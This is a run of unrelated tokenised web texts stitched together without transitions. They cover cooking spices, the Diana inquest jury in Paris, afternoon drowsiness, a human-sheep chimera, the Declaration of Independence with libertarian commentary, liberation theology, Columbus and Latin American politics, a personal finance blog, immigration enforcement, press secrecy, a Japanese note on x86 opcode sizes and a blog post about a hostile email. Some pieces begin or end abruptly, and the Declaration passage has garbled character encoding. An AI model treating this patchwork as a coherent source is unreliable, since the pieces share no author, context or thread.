In the United States , we have many ethnic restaurants and food choices where spices take center stage , and there are still more ways to add them to your diet .
For example , to make sure fresh , delicious herbs are available year - round , start a container garden on your windowsill .
You can also experiment with using unfamiliar spices on familiar foods .
For example , if you love roasting a whole chicken or chicken breasts in paprika , try it with , say , curry powder .
Rub the chicken well with the powder , then roast until juicy and tender .
Dip bites of the chicken in bottled chutney mixed with a little lemon or lime juice .
Alternatively , add a sprinkle of earthy ground cumin , a touch of ground cinnamon , and a pinch of nutmeg or coriander after rice cooks to add bold flavor and aroma .
You can also add fresh herb leaves , such as basil , mint , or tarragon , to salads for a flavor boost .

Slowly , silently , they marched down into the tunnel .
The roar of the traffic had been halted and the roads had been sealed by police .
This was the exact spot where the darkness had closed in on Princess Diana 's life and now , ten years later , a sea of sombre faces stared towards it in the flickering neon light of the underpass .
Nothing but a damaged concrete pillar marked the site of the fatal crash .
The tyremarks on the road had long been worn away .
Scroll down for more ...
But everyone knew what had happened here , and for a full ten seconds no one breathed a word .
Some even bowed their heads .
This was how a British inquest jury followed in the footsteps of Diana 's last hours in their search for the truth about how she and her companion Dodi Fayed died .
There were no prayers or acts of remembrance , because yesterday was n't the time or place .
Instead , six ordinary women and five ordinary men were able to bring to life the maps , film footage and diagrams they had pored over to reconstruct that final , terminal journey .
Scroll down for more ...
And thus , for a few hours yesterday , a small area of Paris was transformed into a coroner 's court , some 350 miles from London , as the entire inquest transferred for two days to France .
Save for the computer screens and transcription equipment of the regular courtroom , pretty much everything was here - a coroner , most of the lawyers , jury bailiffs and a shorthand writer .
They even brought a few bundles of paperwork from court 73 of the Royal Courts of Justice in The Strand , just in case .
Scroll down for more ...
The afternoon began ominously when the coach transporting the jury pulled up outside the Ritz Hotel , first stop on the tour , and parked in the wrong place , where it was immediately surrounded by photographers and TV crew .
Members of the jury pulled curtains in the coach windows to shield themselves from view .
In the confusion , the coach collided with a police motorcyclist , nudging him gently to the ground with a 650 lb motorcycle falling on top of him .
When the coach driver tried to park in the correct place he hit a metal pillar causing one of his tyres to explode .
Scroll down for more ...
The sound caused French police officers to reach for their guns before they realised what had happened - and delayed the start of the trip for nearly 30 minutes .
Jurors had to wait on the bus while the wheel was changed , watched by hundreds of photographers , and curious onlookers trying to work out what was going on .
Someone spotted the luxuriant mane of barrister Michael Mansfield among the TV cameras and asked if he was a film star ( " Not yet , came the reply " ) .
Then in a scene bordering on farce , it was n't the coroner who emerged from the hotel doors - but the unmistakable figure of Victoria Beckham .
She strutted across what were effectively the precincts of the court before disappearing with her entourage into the underground car park , pursued by a breakaway battalion of photographers .
Scroll down for more ...
Out on the streets of Paris , the court group made a bizarre sight as it progressed around the city .
Legal restrictions forbid any identification of the jury , but it is safe enough to report that this was as ordinary a bunch of people as you might find on any station platform .
Ordinary people taking an everyday view of an extraordinary event .
Yet however simply the coroner and lawyers had tried to explain it back in London , there could be no substitute for being here .
Place names suddenly became living images ; distances were something they could gauge for themselves , not measure on a chart .
Amid unprecedented levels of security for a court hearing , around 500 armed anti-terrorist police and undercover agents shadowed the 50 - strong inquest group .
Scroll down for more ...
Among the officers present were 200 members of the elite CRS riot squad - clad in body armour - 200 gendarmes , dozens of officers of the anti-terrorist RAID police unit and undercover officers from the French equivalent of Special Branch , DST .
Such was the sensitivity of the visit that Michele Alliot - Marie , France 's Interior Minister , assigned specialist officers to every site including the Place Vendome and Place de la Concorde .
Police officers manned key points along the route to marshal traffic and pedestrians and guard the jury 's privacy and safety .
It lent the area the flavour of the Presidential cavalcade scenes from The Day of the Jackal .
Had it not been for this massive police presence , and for the motorcycle outriders , the group might have passed itself off as adult students being taken on a heritage tour .

Except that yesterday , of course , they were making history as well as recalling it .
Their guide , the white - haired figure of coroner Lord Justice Scott Baker , slipped easily into the role of genial tourmeister .
He steadied himself on board Coach One by gripping the luggage rack and used the microphone to broadcast inquest landmarks en route .
They stopped off at sites not normally on the tourist map , but crucial to the framework of the hearing .
Among the first of these was the back of the Ritz , in particular the service entrance which Diana and Dodi used to escape photographers waiting outside the front of the hotel that night .
The CCTV camera which recorded those last , poignant images of the couple was still pointing down towards the exit .
Next , a walk along the Place de la Concorde , where they disembarked the coach to examine the road layout .
Scroll down for more ...
The jury has already heard it was here that Ritz driver Henri Paul made the decision to drive along the side of the River Seine , rather than taking the more direct route up the Champs Elysees .
And then , the socalled tunnel of death .
What happened ten years ago in the Pont de l'Alma underpass took place in a split second .
The jury lapped it for about 20 minutes to witness the normal traffic flow , then spent 15 minutes in the traffic - free emptiness after police closed the road that runs through it .
Once , this had been a scene of carnage and frantic activity - firemen and paramedics fighting to recover the occupants of the car , flashguns popping off in the semi-darkness .
There was only calm .
It 's a rare day indeed here when footsteps are the loudest noise .
At the invitation of the coroner , the jurors assembled in silence around pillar 13 .
A large chunk of the square concrete post was still missing leaving a deep , 18 - inch high scar on its leading edge and exposing the metal reinforcement .
Scroll down for more ...
The fact that this was what brought a speeding Mercedes to a dead stop was all anyone needed to imagine the devastation of the impact which killed Henri Paul and Dodi , fatally injured Princess Diana and left bodyguard Trevor Rees - Jones with terrible injuries .
Little wonder they remained quiet .
The coroner broke the silence by inviting the jurors to walk on through the tunnel , and to look back towards the bend and the dip at its entrance .
The Mercedes , they have been told , came in here at between 60 and 65 mph - twice the speed of the coach which had taken them through it a few minutes earlier .
Scroll down for more ...
Later , after a break of several hours , the jurors did the whole journey again
in darkness .
To be fair , it was n't quite an exact mirror of that day in 1997 .
When Diana was being driven around Paris it was in the last days of summer .
Now - five weeks from the anniversary date - the leaves were turning yellow in nearby parks and an autumn wind filled the streets .
But the pre-midnight journey was perhaps a much more realistic picture of what it must have been like that night , even down to the paparazzi who followed the coach convoy yesterday on motorcycles .
This was a watershed day in the progress of the inquest and a rare public insight into the workings of such a high - profile hearing , the first time a British inquest jury has convened abroad .
Even in criminal trials , such visits are comparatively rare , although not unique .
Seven years ago an Old Bailey judge and jury in a war crime trial tramped through the deep snow and minus 20 C temperatures of a Belarus winter to view the murder scenes .
Final stage of the trip was to the Pitie - Salpetriere Hospital , where surgeons battled to save Princess Diana 's life .
Scroll down for more ...
She had made the same journey in an ambulance .
Afterwards , the jury settled down in a heated coach and returned to their hotel .
So will the Paris trip help answer the questions which have played on so many minds this last decade ?
In an interview four months ago , Diana 's sons William and Harry admitted they would never stop wondering what happened that night .
Prince Harry said he did n't think anyone would ever really know .
The inquest still has six months to run , and the jury will doubtless do its duty with great diligence .
But even after this extraordinary day , you could n't help thinking yesterday that Harry had probably got it right .
The New York Times tackles that daily productivity killer called the post - lunch dip — you know , the pull of the yawn toward an afternoon power nap after lunch .
Q . What is happening in the body that it craves rest after lunch ?
A. First , the 24 - hour cycle of the body , or its circadian rhythm , is naturally in a resting phase at this time .
In the afternoon , it happens to converge with another physiological cycle — known as homeostatic — that measures the amount of time spent awake and that is also pushing for a rest .
Add the effects of food , which can also induce drowsiness , and an overpowering desire to sleep may result .

What 's the best way for one to overcome the urge to nap after lunch ?
Unsurprisingly , to take a short nap .
But if your company does n't have sleep pods installed at the office , ditch the caffeine , which can affect your ability to get to sleep that evening .
Instead :
Simply get up and move around the room .
If you need to talk to a colleague at another desk , this could be the ideal time .
It also helps to arise at the same time every morning , Dr. Dinges said .
He has found that getting up earlier than usual — even as little as a half - hour earlier — magnifies drowsiness in the afternoon .

That Yawn After Lunch Is Perfectly Normal [ NYT ]

Scientists have created the world 's first human - sheep chimera - which has the body of a sheep and half - human organs .
The sheep have 15 per cent human cells and 85 per cent animal cells - and their evolution brings the prospect of animal organs being transplanted into humans one step closer .
Professor Esmail Zanjani , of the University of Nevada , has spent seven years and £ 5 million perfecting the technique , which involves injecting adult human cells into a sheep 's foetus .
He has already created a sheep liver which has a large proportion of human cells and eventually hopes to precisely match a sheep to a transplant patient , using their own stem cells to create their own flock of sheep .
The process would involve extracting stem cells from the donor 's bone marrow and injecting them into the peritoneum of a sheep 's foetus .
When the lamb is born , two months later , it would have a liver , heart , lungs and brain that are partly human and available for transplant .
" We would take a couple of ounces of bone marrow cells from the patient , ' said Prof Zanjani , whose work is highlighted in a Channel 4 programme tomorrow .
" We would isolate the stem cells from them , inject them into the peritoneum of these animals and then these cells would get distributed throughout the metabolic system into the circulatory system of all the organs in the body .
The two ounces of stem cell or bone marrow cell we get would provide enough stem cells to do about ten foetuses .
So you do n't just have one organ for transplant purposes , you have many available in case the first one fails . "
At present 7,168 patients are waiting for an organ transplant in Britain alone , and two thirds of them are expected to die before an organ becomes available .
Scientists at King 's College , London , and the North East Stem Cell Institute in Newcastle have now applied to the HFEA , the Government 's fertility watchdog , for permission to start work on the chimeras .
But the development is likely to revive criticisms about scientists playing God , with the possibility of silent viruses , which are harmless in animals , being introduced into the human race .
Dr Patrick Dixon , an international lecturer on biological trends , warned : " Many silent viruses could create a biological nightmare in humans .
Mutant animal viruses are a real threat , as we have seen with HIV . "
Animal rights activists fear that if the cells get mixed together , they could end up with cellular fusion , creating a hybrid which would have the features and characteristics of both man and sheep .
But Prof Zanjani said : " Transplanting the cells into foetal sheep at this early stage does not result in fusion at all . "

Two Hundred Thirty One Years Ago , Thomas Jefferson wrote the following :
When in the Course of human events , it becomes necessary for one people to dissolve the political bands which have connected them with another , and to assume among the powers of the earth , the separate and equal station to which the Laws of Nature and of Natureâ€™s
God entitle them , a decent respect to the opinions of mankind requires that they should declare the causes which impel them to the separation .
We hold these truths to be self - evident , that all men are created equal , that they are endowed by their Creator with certain unalienable Rights , that among these are Life , Liberty and the pursuit of Happiness .
That to secure these rights , Governments are instituted among Men , deriving their just Powers from the consent of the governed , â € ” That whenever any Form of Government becomes destructive of these ends , it is the Right of the People to alter or to abolish it , and to institute new Government , laying its foundation on such principles and organizing its powers in such form , as to them shall seem most likely to effect their Safety and Happiness .
Prudence , indeed , will dictate that Governments long established should not be changed for light and transient causes ; and accordingly all experience hath shewn , that mankind are more disposed to suffer , while evils are sufferable , than to right themselves by abolishing the forms to which they are accustomed .
But when a long train of abuses and usurpations , pursuing invariably the same Object evinces a design to reduce them under absolute Despotism , it is their right , it is their duty , to throw off such Government , and to provide new guards for their future security â€ ” Such has been the patient sufferance of these Colonies ; and such is now the necessity which constrains them to alter their former Systems of Government .
â € ”
The history of the present King of Great Britain is a history of repeated injuries and usurpations , all having in direct object the establishment of an absolute Tyranny over these States .
To prove this , let facts be submitted to a candid world .
And so the men of 1776 rebelled against King George III , citing as examples numerous examples of his usurpation of the rights of man .
And , quite honestly , given the historical record and the example of dictators far worse than George III that history has produced , one might sometimes wonder if the colonials were overreacting .
After all , it ’s not as if King George had authorized usurped legal authority to conduct surveillance on his own citizens , or conducted a war based on false assumptions , pardoned a close aide , taken property from one citizen and given it to another , or restricted people ’s ability to earn a living in their chosen profession .
Heck , when you look at the taxes that led the colonialists to rebel and compare them to what gets taken out of your paycheck every week , its hard to understand what they were so upset about .
Seriously , the lesson of 1776 is n’t so much that George III was a good guy , but that we ’ve forgotten the warning of Thomas Jefferson that
[ T ]he price of liberty is eternal vigilence .
We ’ve let freedom be eroded , little by little , to the point where the idea of the state being allowed to put surveillance cameras on street corners to “ watch ” us seems natural .
We ’ve let privacy become a charade to the point where the Social Security Number has in fact become the National ID that it ’s advocates promised it never would become .
We ’ve let government involvement in the economy expand to the point where a trillion dollars in tax collections seems like a trivial amount .
We ’ve become the frog in the slowly boiling pot of water .
The question , then , is when does it become enough ?
When will the American people finally wake up and realize that their liberties are being eroded on a daily basis ?
And , where are the heirs of Jefferson ?
That , some say , differs from the direct , class - oriented political activism embraced by liberation theology .
Cardinal Ratzinger once called the movement a “ fusing of the Bible ’s view of history with Marxist dialectics , ” and other critics complain of what they see as its emphasis on direct collective action in Jesus ’ name over individual faith .
As John Paul II put it early in his papacy : “ This conception of Christ as a political figure , a revolutionary , as the subversive of Nazareth , does not tally with the church ’s catechism . ”
Certainly at the upper levels of the church hierarchy , liberation theology has been forced into retreat .
Bishops and cardinals who supported and protected the movement in the 1970s and 1980s have either died or retired , succeeded by clerics openly hostile to such communities and the values they espouse .
“ Base communities can only thrive in areas where there are bishops to encourage them , ” said Margaret Hebblethwaite , a British religious writer whose books include “ Base Communities : An Introduction ” and “ The Next Pope . ”
“ If you take away the support of the bishop , it becomes very difficult for them to get anywhere . ”
But the movement remains especially active in the poorest areas like the Amazon , the hinterlands of northeast Brazil and on the outskirts of large urban centers like this one , the largest in Brazil , with nearly 20 million people in the metropolitan area .
Hoping to draw less attention and opprobrium to themselves , some of these groups simply say they are engaged in a “ social pastorate . ”
Sparring between liberation theologians and Benedict — whose own theology was formed in reaction to the reach of Nazi ideology — has been long and bitter .
In 1984 , as the Vatican official charged with supervising questions of faith and doctrine , he declared that “ the theology of liberation is a singular heresy . ”
More recently , he said , “ it seems to me we need not theology of liberation , but theology of martyrdom , ” and argued that the movement will become a valid theology “ only when it refuses to accept power and worldly logic ” and instead emphasizes “ inner liberty . ”
But that was when his job was to carry out John Paul ’s orders , and there is speculation here that his views may have softened somewhat .
At sunrise he took a small boat and armed men to shore and planted a royal standard .
With a solemn oath he took possession of the territory for the king and queen of Spain .
Natives emerged from the trees and watched from a distance , puzzled .
It was 1492 .
More than five centuries later the anniversary of that event resounds with an ominous clang .
Millions of people in central and South America lament that encounter in the Bahamas as the beginning of their ancestors ' annihilation .
The indigenous inhabitants lost everything to the invaders : gold , land , freedom , culture , until there was almost nothing left .
Disease and slaughter wiped most of them out .
" It was a calamity , " said Mark Horton , an archaeologist and Columbus expert at the University of Bristol .
Now , however , a counter - attack is under way .
After centuries as underdogs , indigenous people are rising up - peacefully - to seize political power and assert their heritage .
The so - called pink tide of leftwing governments has surged on the back of indigenous movements intent on dismantling the region 's eurocentric legacy - starting with Columbus .
Across the Andes the explorer once feted as a hero by the Europeanised elite is having his story rewritten , his statue toppled and his name turned to mud .
Leading the assault is Venezuela 's president , Hugo Chávez .
" They taught us to admire Christopher Columbus , " he said during a recent televised address , his tone incredulous , while flicking through a 1970s school textbook .
" In Europe they still speak of the ' discovery ' of America and want us to celebrate the day . "
Instead Mr Chávez has renamed October 12 " indigenous resistance day " and mounted a campaign against colonial residue .
Textbooks are to be revised under a curriculum that will stress the opposition to Spanish conquest as doomed but heroic .
This week the president , who boasts of having an indigenous grandmother , renamed the cable car system which soars over Caracas , the capital , as Warairarepano , which means big mountain in an indigenous coastal tongue .
" For Chávez this is a natural cause because of his philosophy about the mistreatment of the downtrodden and the need for redress , " said Larry Birns , of the Council on Hemispheric Affairs thinktank .
City authorities confirmed this week that a bronze Columbus statue which activists toppled from a Caracas plaza three years ago will remain under wraps .
Repairs were almost complete but it would not return to its plinth because the site had been renamed : Avenue Columbus is now Avenue Indigenous Resistance .
The statue is expected to go to a museum .
In contrast , a statue of María Lionza , a legendary indigenous queen who is the subject of a thriving cult , has been prominently restored .
Last night thousands of devotees made their way to the holy mountain of Sorte for an annual festival which honours her and an indigenous chief and black slave killed by the Spanish .
Rehabilitated
Scholars tend to assign Columbus a walk - on part in history as the one who opened the New World door but had little role in the bloody aftermath .
" He was part of a process that was inevitable , of Europe coming into contact with the wider world , " said Dr Horton .
" It 's mistaken to see him as a totem of the bad guys .
He actually was n't too bad . "
It has been a rollercoaster reputation .
A dispute with Spain 's king and queen landed Columbus in chains and disgrace .
The Victorians rehabilitated him as an inspiration for their own explorers , a valiant image which largely endures in the west .
Spain hopes DNA analysis will prove he came from Castille , while Italy hopes to confirm he was Genoese .
The 500th anniversary in 1992 prompted debate in the US about whether he should be recast as a villain but the controversy petered out , leaving the navigator a bruised but still revered figure .
US schoolchildren get the day off on what remains Columbus Day .
In South America , however , radical leftwing governments in Bolivia , Ecuador and Venezuela are busy overturning what they see as his legacy : centuries of domination by Spaniards and their descendants , pale - skinned elites who continued oppressing darker compatriots even after the continent gained independence .
" Even now they conceive us as animals , as dogs .
That has got to change , which is what we are fighting for - to be recognised as equal citizens with equal rights , " said Wilber Flores , a congressman and president of Bolivia 's indigenous parliament .
In Venezuela Mr Chávez enshrined indigenous rights in a new constitution and made the country 's 35 tribes visible through state - funded TV stations which broadcast from regions barely known to city - dwellers .
In Ecuador President Rafael Correa , who often wears traditional dress and speaks in Quechua , has rallied indigenous voters behind his effort to " reinvent " the country along socialist lines .
President Evo Morales , an Aymara Indian and Bolivia 's first indigenous leader , has also fused indigenous rights with a socialist agenda hostile to Washington .
He regards the US as the latest manifestation of a predatory colonialism that started in 1492 .
Last month it voted against a United Nations declaration on indigenous rights .
Rapacious
Mr Morales has accused the US of raiding Bolivia 's natural resources and persecuting coca farmers as cocaine producers when in fact they are cultivating a plant that has had other , innocent , uses since the Incas .
He will mark the anniversary of Columbus 's landing with a visit to the coca growing region of Chapare , which is playing host to a summit of indigenous people from across Latin America .
In an interview with the Guardian the Bolivian leader suggested the rapacious intruders who crossed an ocean thirsting for riches , and those who later invented capitalism , should have been studying , not conquering , the natives .
" Indigenous communities know how to live in harmony with mother earth and that is the difference between us and Europe and the United States . "

This article is part of an M - Network group writing project .
We are all writing articles revealing our best and worst financial decisions .
See the end of this article for links to other M - Network member articles !
I ’ve made a number of good and bad financial decisions in my life .
Unfortunately until about a year ago , the majority of them where bad .
I could list far more than 6 decisions and frankly could probably write a whole book on the them .
To keep from completely boring you though , I ’ll only share 3 of each .
My sincere hope is that you can learn a little something from my decisions and maybe avoid learning things the hard way like I did .
Our 3 Worst Financial Decisions
# 1 – Purchasing an RV
About 6 years ago , we decided to buy an RV .
We purchased a new 26 ′ travel trailer .
It was incredibly nice and we enjoyed many wonderful times camping at the South Carolina beaches and the North Carolina mountains .
Here ’s where we went wrong though :
We paid too much for it when we bought it .
We should have done more research on dealer price as we ended up paying about 10 % too much .
We purchased new .
RVs depreciate in value at an incredibly fast rate , purchasing a new one is n’t a smart decision and you will really take a beating .
A much better option is to purchase a 1 - 2 years old used model , and let someone else take the hit .
Many people purchase RVs only to find fairly quickly they do n’t enjoy it .
Finding opportunities like this will provide you with the best deal .
We folded our negative equity into a new trailer .
Not only did we make the mistake of buying new once , we did it again not 2 years later .
We upgraded to a larger RV and folded the negative equity from our first camper into the new one making a bad financial decision even worse .
We ended up selling our trailer for $ 9,000 .
The balance still owed was around $ 12,000 .
We paid about $ 19,000 for it new .
Add to this the cost of insurance , storage , the camping supplies and the monthly payments for a vehicle to pull and you have the biggest money pit we ’ve ever owned .
Sure , the adventure was fun and we loved camping , but it just was n’t worth it .
We ’ll wait until we ’re retired and hit the road then .
# 2 – Paying Too Much For Our Home
When we moved back to North Carolina , we had picked out two neighborhoods where we would consider living before we came down .
We additionally picked out the specific model and floor plan we wanted .
My wife and I both feel in love with a 2 - story with a front porch .
The house we wanted was a high demand one .
One of the neighborhoods was n’t building anymore nor where there any for sale .
The second neighborhood had one left , the model , which had just gone on sale .
The model was about $ 20,000 higher than the standard home , but the sales person told us that was due to the all of the options : extra trim , higher quality carpet , larger A/C units , curtains , etc , etc .
Our real - estate agent ( who was under a buyers broker agreement ) agreed , and that based on her fair market analysis the house was a good buy .
Given we were renting a one bed - room apartment on a short term lease at about $ 1500 / month ( with 2 kids I might add ) we decided to buy it .
We later found out that being a model ads nothing to the value and when you go to sell , it makes no difference to the home value at all .
Our real - estate agent lied about the fair market analysis .
We should have paid $ 20,000 - $ 30,000 less than we did , especially since the house was already 5 - years old .
Only in the past year or two now that housing values in our area have started to increase significantly have we gone positive .
We finally owe less than the home is worth .
Hard lesson learned , but a valuable one for us in the future .
In hindsight , we should have sued out buyer broker agent for misrepresentation and we should have done our own homework .
# 3 – Doing an early withdrawal of our 401 k to pay - off our debt
Some years back , we were deep in debt .
We did n’t know about debt snowballs , did n’t know about living on less than you earn , or even how to live on a budget .
We just knew we were in more debt than we could pay and had money in our 401 k we could use to pay it off .
We decided to take an early withdrawal from our 401 k to payoff all of our credit card debt .
I paid the taxes and the the 10 % penalty , and in hindsight ended up paying what equated to 40 % interest for that money .
We did pay - off the credit card debt , but failed to get rid of our credit cards .
Not 5 years later , were right back in the same deep in debt situation .
Do n’t withdrawal money from your 401k under any circumstance .
It ’s like taking out a loan at 40 % interest to pay off your debt .
Additionally , you basically kill any progress you ’ve made on your 401k accounts compound interest , making it grow that much slower when and if you restart .
Our 3 Best Financial Decisions
# 1 – Cutting Up Our Credit Cards
8 months ago we stood around the shredder and each of us , including our children put a credit card in the shredder .
It was a life changing moment for all of us .
A moment where we removed the temptation of having cards from our wallets , a moment we declared war on debt , and a valuable lesson for our children .
We had cut up our cards in the past , but always kept one “ just in case ” .
The temptation to use that one card was just too strong , and we always did .
Not this time , all of our cards are gone .
The only credit card I carry in my wallet is my corporate card for work .
We have been credit card free for 8 months , and have n’t even come close to needing one .
We have a $ 1,500 emergency fund and use it to cover any unplanned expenses .
We do n’t miss those cards one bit and most likely will never have one again .
Do you struggle with using credit cards ?
Do you find yourself always coming up with a reason to use them ?
Get your cards out , call the family down ( if you have one ) and shred them , blend them , scissor them , burn them , whatever but remove them from your life , you wo n’t regret it .
# 2 – Getting Control of Our Finances
At the same time we removed credit cards from our life , we also decided to get control of our finances .
This involved establishing an emergency fund , creating a budget , living on less than we earned , and aggressively paying off our debt using a debt snowball .
Prior to doing this , it was a like a dark financial cloud followed us everyday .
We worried about our finances all the time .
We lived paycheck to paycheck , paid bills late , and overdrafted our accounts far too frequently .
It was a constant strain that caused money fights and frequent lack of sleep .
Since we gotten control of our finances , the dark cloud is gone .
We do n’t worry about money , we know where our money goes and how it is being spent .
We feel more in control and see significant progress being made on paying off our debt .
We are n’t out of debt , but because we have a plan and see our debt slowly going away we feel so much better .
Controlling your finances does n’t take much time , it ’s easy to do , and will dramatically change your life .
Unfortunately it took something pretty major happening in our lives to make us realize our finances where out of control , but I ’m glad it happened .
Do n’t learn this the hard way , get control of your finances and see what a difference it makes .
# 3 – Buying Used Cars
Not long ago we had two new cars .
I had a new Dodge diesel pickup ( to pull the camper ) and my wife a new full size Dodge conversion van .
The van was sold and a 2 - year old Dodge Durango purchased .
When we sold our RV , I sold my truck and used the positive equity to purchase a $ 4,000 2001 Nissan Sentra .
This was n’t too difficult for us as we had put a significant amount of money down on both of the new vehicles so we were n’t upside down .
The equity in the van was used as a down payment on the Durango , and the equity in my truck used to pay cash for the Sentra and the remainder to pay for the negative equity on our camper .
Cars depreciate almost as fast as RVs .
The average new car loses $ 2,000 – $ 3,000 dollars as soon as you drive it off the lot .
To make matters worse , most people finance them for 5 - 7 years .
Financing and paying on a vehicle that is constantly losing value is probably one of the worst financial decisions you can make .
Instead , find a well kept car that is 2 or more years old and pay cash for it .
Let someone else take the initial large depreciation hit .
Cars 2 years old are almost always still under warrenty and very reliable .
If you ca n’t afford a car that new , do some research and find out what cars are the most reliable that meet your needs to buy an older one like I did .
Mine has 120,000 miles on it and runs great .
It ’s amazing how nice a car drives and runs when it ’s paid for !
oo00OO00oo
Sadly , when I wrote this article I really had to think hard to come up with the best financial decisions I ’ve made .
The worst came to mind far too quickly .
3 is only a very small portion of the mistakes I ’ve made .
You can see a few more by reading another article I wrote .

The approach is expected to play well with conservatives who have long demanded that the administration do more to enforce existing immigration laws , but it could also lead to renewed pressure from businesses on Congress to provide legal status for an estimated six million unauthorized immigrant workers .
“ We are tough and we are going to be even tougher , ” Russ Knocke , the spokesman for the Department of Homeland Security , said yesterday .
“ There are not going to be any more excuses for employers , and there will be serious consequences for those that choose to blatantly disregard the law . ”
Experts said the new rules represented a major tightening of the immigration enforcement system , in which employers for decades have paid little attention to notices , known as no-match letters , from the Social Security Administration advising that workers ’ names and numbers did not match the agency ’s records .
Illegal workers often provide employers with false Social Security numbers to qualify for a job .
Employers , especially in agriculture and low - wage industries , said they were deeply worried about the new rules , which could force them to lay off thousands of immigrant workers .
More than 70 percent of farmworkers in the fields of the United States are illegal immigrants , according to estimates by growers ’ associations .
“ Across the employer community people are scared , confused , holding their breath , ” said Craig Regelbrugge , co-chairman of the Agriculture Coalition for Immigration Reform , a trade organization .
“ Given what we know about the demographics of our labor force , since we are approaching peak season , people are particularly on edge . ”
I am at a conference on war , liberty and the free press sponsored by the Liberty Fund , and there are some discussions we have held that I believe are worth passing on .
One of the most significant aspects of the relationship between the press and the military in time of war is secrecy .
Almost everybody , including the most liberal advocates of a free press , seems to agree , for example , that news of plans for future troop movements or actions , at least during actual combat , should not be published lest they give the enemy information that could be valuable to defeating an attack or planning an ambush .
In practice this is hardly ever an issue ; most American reporters are pretty scrupulous about such matters .
The only instance of which Im aware that something similar happened in Iraq was when Geraldo Rivera ( not quite my idea of a real journalist ) drew some possible plans with a stick in the sand on camera , but it also seems to be the case that he had been given a phony briefing so he wasnt really revealing anything genuinely useful to an enemy .
Still , it could have been a sticky situation , especially given the instantaneous nature of transmission of news reports today , compared with the old , old days when a story might not get into newspapers back home for three days or more .
Given that criterion , what about this story in Thursdays USA Today ?
It noted that airport screeners at LAX missed 75 percent of the fake explosives and bomb parts that Transportation Security Administration testers hid in carry - on bags or under clothes , while screeners at OHare missed 60 percent of them .
Could such a story alert potential terrorists of a vulnerability to a possible suicide bomb mission ?
If so , is it the kind of story that should not be published ?
Most of us agreed that it was better to print the story to create an incentive to correct the problem ( assuming the airport screening does much good at all , which is nt necessarily obvious ) .
But a case could be made for suppressing it .
This leads to the larger issue of government secrecy .
When I was in high school , my father , a chemist who worked for a defense contractor , got me summer jobs in the receiving department .
So there I was , a punk kid who had not been scrupulously screened , routinely handling paperwork and parts ominously stamped  Confidential or  Secret . 
Some of the stuff I simply didnt understand , but it soon became reasonably obvious to me that while they were intended for use in missiles , many of the parts were simply standard industrial items and the justification for classifying them was weak at best .
Later , when I spent time in Babylon - on - the - Potomac , it became even more obvious to me that many items are classified without any justification remotely connected to genuine national security .
Some were classified to cover up embarrassments or mistakes .
Others were classified simply out of inertia .
There was consensus in our group that a large portion of the stuff that is classified  perhaps as much as 95 percent ?
 is done so without any genuine justification in national security .
I would argue for a more radical position : that the government takes money from us by force and uses it to develop information that it then hides from us , the people .
Theres an argument that since it was developed with our money , that the information really belongs to us and shouldnt be kept secret at all .
Enemies or potential enemies can usually get the stuff anyway , so the only people from whom it is hidden are the people , who in theory are supposed to be the masters of the government , which is their servant .
I dont know if I would defend all the implications of this argument to its logical end that nothing should be classified as secret , but its worth putting out there for discussion .
We discussed another issue that s sadly relevant today .
Most wars of modern times have a beginning and a foreseeable end .
The assumption is that once victory is won , the liberties that have been taken away for the duration , or the restrictions placed on the people , will be restored or lifted , and life will return to normal , with the presumption of liberty reigning .
The great Global War on Terror , however , is a war without a foreseeable end .
What president , Democrat or Republican , would declare the war won , knowing that the next day , or the next week , or the next month , a terrorist attack could occur , making him or her look like an idiot ?
So we have plunged into a war without a foreseeable end .
This means that it is very possible that the freedoms we are losing during the current conflict  to fly without hassles , to be free from electronic surveillance , to be free from cameras stationed all over major cities , and on and on  may never be restored .
The nature of the GWOT is that it has no foreseeable end .
So the losses of freedom we are suffering may not only serve as a precedent for further reductions in freedom , they could be permanent features of the American landscape .
The war on Iraq was a huge mistake , but at some point it will be resolved , even if it involves relatively permanent military bases in Iraq .
But will there ever be an end to the Global War on Terror ?
That could have much more deleterious implications for the preservation of American liberties than the Iraq war .

例えば、8bitのレジスタをINCするよりも16bitのワードレジスタをINCしたほうが実はオプコードが1byte少なかったりします。
inc ch ; FEC5 inc cl ; FEC1 inc cx ; 41
chレジスタの領域までオーバーフローしないときなら、inc cl の代わりに inc cx を使う と1 byte節約することができます 。

inc *x / dec *x 命令をできるだけ使うようにレジスタを再配置して、call命令の呼び出し回数を減らし、ジャンプ命令を全部相対指定にしたら
140 → 118 byte ( - 32byte ) に短縮できました 。
あと、出力する区切り文字も CR LF ( 2byte ) から半角スペー ス ( 1 byte ) に変更しました 。

Update : New developments below .
I just got the strangest email .
I think I ’m going to reproduce it here in full .
Date : Thu , 30 Aug 2007 16:32:05 - 0700 ( PDT )
From : Julie Winfield < beverlybimbo at yahoo dot com >
Subject : Hi Justin
You do n’t know me , but I live by you and I would like to warn you that I am adding you to this site as a bad neighbor .
I am tired of putting up with your crap .
http://www.rottenneighbor.com
Are you ok with that ?
No ?
Well then too bad !!
- Julie
Wow .
I. Have .
No. Words .
Here ’s the funny part : it does n’t appear that “ Rotten Neighbor ” currently even covers San Francisco .
I entered my zip code and there were 3 listings , none me .
A quick Google search for Julie Winfield returns a dermatologist in Mill Valley .
On the other hand , a quick Google search for the first part of her email address , beverlybimbo , confirms that she lives in Los Angeles ( based on a Craigslist posting “ Looking for a Google Maps API expert ” ) .

Looking for a Google Maps API expert to design a functioning map that allows users to contribute markers to the map by searching address , city , state , zip code etc …
It needs to be completely automated .
The markers / popups will include title , description , and name .
I also need the ability to serve the user ads that will most likely be geographically targeted .
PHP , MySQL and Javascript will also be required so you need to be skilled in these languages as well .
* Location : Los Angeles
That ’s a curious coincidence , considering Rotten Neighbor is essentially a Google Maps app .
Based on the time I got the email ( 4:32 pm ) I wonder if the LA listing created at 4:28 is the one intended for my doppelganger :
Vanowen St. between Mason and Desoto .
What a horrible place .
Many gang members or wannabees
The north side of Vanowen is lined with apartment buildings .
There is absolutely no parking .
Somebody was shot and killed on Kelvin Ave .
Cars are stolen .
Car windows are broken just for the fun of it .
Helicopters hover around at least once a week .
It ’s filled with people who do n’t care about the cleanlines of their surroundings .
People walk their dogs and do n’t pick after them .
Horrible place .
Looking over my referrer log from 4 pm today ( or for hits to my about page — the most obvious place someone would get my email address ) did n’t turn up any smoking guns .
I ’ll be curious to see how / if she responds to my reply .
Update :
This afternoon , I got a snarky reply from “ Julie ” :
Do n’t worry Justin .
Soon everybody will know what kind of neighbor you actually are !
What ?
The ?
Fuck ?
So at this point I started think that she ’s working for Rotten Neighbor , in an attempt to bait bloggers into linking to their site ( as terrie mentions in the comments ) .
Great it worked .
